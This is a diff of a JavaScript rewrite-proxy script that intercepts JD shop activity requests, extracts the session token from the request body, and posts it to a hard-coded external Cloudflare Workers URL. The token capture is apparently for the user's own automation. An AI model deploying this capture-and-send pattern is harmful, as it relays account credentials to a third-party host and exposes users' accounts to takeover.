@@ -1,35 +1,31 @@
-const $ = new Env('店铺签到token');
-
+const $ = new Env('获取店铺token');
 var jUrl = $request.url;
+//var jUrl = "https://cjhydz-isv.isvjcloud.com/wxTeam/shopInfo";
 var jBody = $request.body;
 console.log(jUrl);
 console.log(jBody);
-var reqBody = getQueryString(jBody, "body");
-var reqToken = getQueryString(jBody, "token");
+var token = getQueryString(jBody, "token");
+console.log(token);
+//var $url = url(jUrl);
+var notifyText = `export Mytoken="${token}"`
 
-
-
-var notifyText = `export MyShopToken="${reqToken}"`
-
+console.log(`\n\n${notifyText}`)
 !(async () => {
-    if (reqBody.shopId) {
+    if (token) {
         try {
-            await update(notifyText);
-            $.msg(`店铺签到token`, `获取活动信息成功🎉`, `${notifyText}`);
+            await update(notifyText)
+            $.msg(`组队分京豆`, `获取活动id成功🎉`, `${notifyText}`)
         } catch (error) {
             $.logErr(error);
         } finally {
             $.done();
         }
     }
-})()
-    .catch((e) => {
-        $.log("", `❌ ${$.name}, 失败! 原因: ${e}!`, "");
-    })
-    .finally(() => {
-        $.done();
-    });
-
+})().catch((e) => {
+    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
+}).finally(() => {
+    $.done();
+})
 
 function getQueryString(qStr, name) {
     var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
@@ -40,8 +36,23 @@ function getQueryString(qStr, name) {
     return null;
 }
 
+function url($url) {
+    var url = $url.split('//');
+    if (url[0] === "http:" || url[0] === "https:") {
+        var protocol = url[0] + "//";
+        var host = url[1].split('/')[0];
+        url = protocol + host;
+        var path = $url.split(url)[1];
+        return {
+            protocol: protocol,
+            host: host,
+            path: path
+        };
+    }
+}
+
 function update(body) {
-    text = `${body}`;
+    text = `${body}`
     let opt = {
         url: `https://curly-wave-1a79.iroyway.workers.dev/`,
         body: `text=${text}`,
